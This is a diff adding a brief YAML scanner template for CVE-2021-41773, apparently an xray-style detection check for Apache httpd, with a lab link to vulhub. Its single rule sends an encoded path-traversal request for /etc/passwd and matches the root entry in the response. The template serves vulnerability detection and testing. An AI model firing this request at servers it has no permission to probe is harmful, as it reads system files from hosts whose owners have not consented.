@@ -1,0 +1,11 @@
+name: poc-yaml-CVE-2021-41773
+rules:
+  - method: GET
+    path: /icons/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
+    follow_redirects: false
+    expression: |
+      response.status == 200 && "root:[x*]:0:0:".bmatches(response.body)
+detail:
+  author: 曦s
+  links: 
+    - https://github.com/vulhub/vulhub/tree/master/httpd/CVE-2021-41773
